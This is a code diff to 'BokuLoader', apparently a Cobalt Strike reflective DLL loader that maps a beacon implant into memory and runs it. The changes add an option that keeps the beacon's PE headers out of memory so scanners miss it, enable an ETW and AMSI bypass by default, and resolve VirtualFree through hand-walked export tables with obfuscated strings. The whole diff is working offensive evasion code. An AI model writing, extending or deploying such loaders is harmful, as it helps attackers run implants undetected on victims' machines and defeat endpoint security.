@@ -1,4 +1,6 @@
 #define WIN32_LEAN_AND_MEAN
+#define NOHEADERCOPY // RDLL will not copy headers over to the loaded beacon
+#define BYPASS // ETW & AMSI bypass switch. Comment out this line to disable 
 #include <windows.h>
 
 void* getDllBase(void*);
@@ -55,7 +57,7 @@ typedef void*  (WINAPI * tVirtualAlloc) (void*, unsigned __int64, unsigned long,
 typedef void*  (WINAPI * tVirtualProtect)(void*, unsigned __int64, unsigned long, unsigned long*);
 typedef void*  (NTAPI  * tNtFlushInstructionCache)(HANDLE, PVOID, unsigned long);
 typedef void*  (WINAPI * DLLMAIN)(HINSTANCE, unsigned long, void* );
-#define BYPASS // ETW & AMSI bypass switch. Comment out this line to disable 
+typedef void*  (WINAPI * tVirtualFree)(void* lpAddress, SIZE_T dwSize, DWORD dwFreeType);
 #ifdef BYPASS
 typedef BOOL (WINAPI * tWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
 void bypass(Dll* ntdll, Dll* k32, tLoadLibraryA pLoadLibraryA);
@@ -91,6 +93,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     tVirtualAlloc pVirtualAlloc      = (tVirtualAlloc)getSymbolAddress(kstr3, (void*)12, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
     char kstr4[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
     tVirtualProtect pVirtualProtect  = (tVirtualProtect)getSymbolAddress(kstr4, (void*)14, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
+    char kstr5[] = {'V','i','r','t','u','a','l','F','r','e','e',0};
+    tVirtualFree pVirtualFree        = (tVirtualFree)getSymbolAddress(kstr5, (void*)11, k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
 
     // Initial Source Reflective DLL
     Dll rdll_src;
@@ -110,8 +114,14 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     // Allocate new memory to write our new RDLL too
     Dll rdll_dst;
     rdll_dst.dllBase              = (void*)pVirtualAlloc(NULL, (unsigned __int64)rdll_src.size, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
-    // Write Headers from init source RDLL to new destination RDLL
+
+    // Optionally write Headers from initial source RDLL to loading beacon destination memory
+    #ifdef NOHEADERCOPY
+    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree - MEM_DECOMMIT = 0x00004000. Second arg can be a value from 1-4095
+    pVirtualFree(rdll_dst.dllBase,1,0x00004000); // Decommit the first memory page (4096/0x1000 bytes) which would normally hold the copied over headers  - "Private:Reserved"
+    #else
     copyMemory(rdll_src.SizeOfHeaders, rdll_src.dllBase, rdll_dst.dllBase);
+    #endif
 
     // Save .text section address and size for destination RDLL so we can make it RE later
     BOOL textSectionFlag = TRUE;
@@ -440,8 +450,8 @@ __declspec(dllexport) void* WINAPI BokuLoader()
              [newRdllAddr] "r" (rdll_dst.dllBase)
         );
     }
-    rdll_dst.NewExeHeader   = getNewExeHeader(rdll_dst.dllBase);
-    rdll_dst.OptionalHeader = getOptionalHeader(rdll_dst.NewExeHeader);
+    //rdll_dst.NewExeHeader   = getNewExeHeader(rdll_dst.dllBase);
+    //rdll_dst.OptionalHeader = getOptionalHeader(rdll_dst.NewExeHeader);
     void* BaseAddressDelta;
     __asm__(
         "mov rax, %[OptionalHeader] \n"
@@ -453,7 +463,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         "sub rcx, rax \n"       // dllBase.ImageBase
         "mov %[BaseAddressDelta], rcx \n"
         :[BaseAddressDelta] "=r" (BaseAddressDelta)
-        :[OptionalHeader] "r" (rdll_dst.OptionalHeader),
+        :[OptionalHeader] "r" (rdll_src.OptionalHeader),
          [dllBase] "r" (rdll_dst.dllBase)
     );
     void* newRelocationDirectoryAddr;
@@ -464,7 +474,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
         "add rax, rbx \n"             // OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
         "mov %[newRelocationDirectoryAddr], rax \n"
         :[newRelocationDirectoryAddr] "=r" (newRelocationDirectoryAddr)
-        :[OptionalHeader] "r" (rdll_dst.OptionalHeader)
+        :[OptionalHeader] "r" (rdll_src.OptionalHeader)
     );
     void* nextRelocBlock;
     __asm__(
@@ -588,7 +598,7 @@ __declspec(dllexport) void* WINAPI BokuLoader()
     }
     unsigned long oldprotect = 0;
     pVirtualProtect(rdll_dst.TextSection, (unsigned __int64)rdll_dst.TextSectionSize, PAGE_EXECUTE_READ, &oldprotect);
-    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_dst.OptionalHeader);
+    rdll_dst.EntryPoint = getBeaconEntryPoint(rdll_dst.dllBase, rdll_src.OptionalHeader);
     pNtFlushInstructionCache((void*)-1, NULL, 0);
     ((DLLMAIN)rdll_dst.EntryPoint)( rdll_dst.dllBase, DLL_PROCESS_ATTACH, NULL);
     return rdll_dst.EntryPoint;
